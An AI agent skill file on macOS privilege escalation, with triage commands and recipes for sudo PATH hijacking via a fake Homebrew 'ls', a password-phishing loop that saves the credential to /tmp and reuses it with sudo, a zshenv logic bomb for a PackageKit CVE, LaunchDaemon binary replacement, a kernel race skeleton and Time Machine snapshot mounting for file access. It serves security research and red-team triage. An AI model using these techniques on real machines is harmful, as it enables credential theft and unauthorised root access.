---
name: macos-privilege-escalation
description: macOS privilege escalation techniques and triage. Use this skill whenever the user mentions macOS privilege escalation, privesc, gaining root, escalating privileges on macOS, TCC bypass, LaunchDaemon abuse, XPC vulnerabilities, or any macOS security research involving privilege escalation. Also use when analyzing macOS systems for privilege escalation vectors, reviewing macOS security configurations, or documenting macOS attack paths.
---

# macOS Privilege Escalation

A comprehensive guide to macOS privilege escalation techniques, from user interaction attacks to kernel-level vulnerabilities.

## Quick Triage Checklist

Start here to identify potential privilege escalation vectors on a macOS system:

```bash
# Check for writable privileged helpers
ls -l /Library/PrivilegedHelperTools/

# Check LaunchDaemons for writable plists or programs
ls -l /Library/LaunchDaemons/

# Find user-writable files in privileged locations
find /Library/PrivilegedHelperTools /Library/LaunchDaemons -writable 2>/dev/null

# Check for vulnerable helper calls in logs
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"' --style syslog
```

## User Interaction Attacks

### Sudo Hijacking via PATH

macOS preserves the user's `PATH` when executing `sudo`, unlike Linux. This allows hijacking binaries in user-writable directories:

**Target locations:**
- `/opt/homebrew/bin` (most common on Apple Silicon)
- `/usr/local/bin` (Intel Macs)
- Any directory in user's PATH before system paths

**Example hijack:**
```bash
# Create malicious binary in Homebrew path
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# Victim runs: sudo ls
```

### Dock Impersonation

Create fake applications that appear in the Dock to trick users into granting privileges:

**Key steps:**
1. Create `.app` bundle structure
2. Copy legitimate app icon
3. Create malicious executable
4. Add to Dock using `defaults write`
5. Trigger `killall Dock` to refresh

**Target applications:**
- Google Chrome (common, recognizable)
- Finder (cannot be removed, place fake next to real)
- System utilities (Terminal, System Preferences)

**Use the bundled script:** `scripts/dock-impersonation.sh`

### Password Prompt Phishing

Capture sudo-capable passwords through social engineering:

**Pattern:**
1. Identify logged-in user with `whoami`
2. Loop password prompts until `dscl . -authonly` succeeds
3. Cache credential and use with `sudo -S`

**Example flow:**
```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass

# Reuse for privileged actions
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/payload
printf '%s\n' "$pw" | sudo -S cp /tmp/payload /Library/LaunchDaemons/
```

## Modern macOS Vectors (2023-2025)

### AuthorizationExecuteWithPrivileges Abuse

Deprecated in 10.7 but still functional on Sonoma/Sequoia. Many updaters use `/usr/libexec/security_authtrampoline` with untrusted paths.

**Detection:**
```bash
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'
```

**Exploitation:**
1. Find vulnerable helper calls
2. Replace expected binary with trojan
3. Trigger legitimate update to spawn payload

### Privileged Helper / XPC Triage

Modern macOS privilege escalations often involve root LaunchDaemons exposing Mach/XPC services.

**Use the bundled script:** `scripts/privileged-helper-triage.sh`

**What to look for:**
- Helpers accepting requests after uninstall
- Scripts executed from `/Applications/...` or user-writable paths
- PID-based or bundle-id-only peer validation (raceable)
- Root methods consuming user-controlled paths

### PackageKit Script Environment Inheritance (CVE-2024-27822)

**Affected versions:** Sonoma < 14.5, Ventura < 13.6.7, Monterey < 12.7.5

**Vulnerability:** User-initiated installs via `Installer.app` execute PKG scripts as root inside the current user's environment. Shell scripts (`#!/bin/zsh`) load `~/.zshenv` as root.

**Logic bomb pattern:**
```bash
# Plant payload in shell startup
echo 'id > /tmp/pkg-root' >> ~/.zshenv

# Wait for vulnerable zsh-based installer
```

**Use the bundled script:** `scripts/packagekit-inspect.sh`

### LaunchDaemon Plist Hijack (CVE-2025-24085 Pattern)

If a LaunchDaemon plist or its `ProgramArguments` target is user-writable:

**Exploitation steps:**
1. Unload the LaunchDaemon
2. Replace the binary
3. Modify the plist
4. Reload the LaunchDaemon

**Example:**
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.example.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/example
chmod 755 /Library/PrivilegedHelperTools/example
# Modify plist to point to new binary
sudo launchctl bootstrap system /Library/LaunchDaemons/com.example.plist
```

### XNU SMR Credential Race (CVE-2025-24118)

**Vulnerability:** Race in `kauth_cred_proc_update` allows corruption of `proc_ro.p_ucred` pointer.

**PoC structure:**
```c
// Thread A
while (1) setgid(rand());
// Thread B  
while (1) getgid();
```

**Impact:** Reliable local kernel privilege escalation without SIP bypass.

### SIP Bypass via Migration Assistant (CVE-2023-32369 "Migraine")

**Prerequisites:** Already have root on live system

**Chain:**
1. Trigger `systemmigrationd` with crafted state
2. Run attacker-controlled binary
3. Use inherited `com.apple.rootless.install.heritable` entitlement
4. Patch SIP-protected files for persistence

### NSPredicate/XPC Expression Smuggling (CVE-2023-23530/23531)

**Vulnerability:** Apple daemons accept NSPredicate objects over XPC, validating only `expressionType` field.

**Impact:** Code execution in root/system XPC services (e.g., `coreduetd`, `contextstored`) when combined with sandbox escape.

**Detection:** Look for XPC endpoints that deserialize predicates without robust visitor validation.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC Bypass

**Prerequisites:** Application with Full Disk Access (FDA) granted

**Technique:** Any user can create and mount Time Machine snapshots, accessing all files from that point in time.

**Steps:**
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /

# Mount snapshot (noowners allows current user access)
mkdir /tmp/snap
/sbin/mount_apfs -o noowners -s <snapshot-name> /System/Volumes/Data /tmp/snap

# Access files
ls /tmp/snap/Users/admin_user
```

**Use case:** Access files from before a security update, or read protected files from a snapshot.

## Sensitive Information

For sensitive file locations useful in privilege escalation, see:
- `macos-files-folders-and-binaries/macos-sensitive-locations.md`

## References

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race](https://github.com/jprx/CVE-2025-24118)
- [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [CVE-2020-9771 Original Report](https://theevilbit.github.io/posts/cve_2020_9771/)

## Related Skills

- `macos-tcc` - TCC permission manipulation
- `macos-sensitive-locations` - Sensitive file locations
- `macos-xpc-authorization` - XPC authorization bugs
- `macos-installers-abuse` - Installer-specific abuse techniques
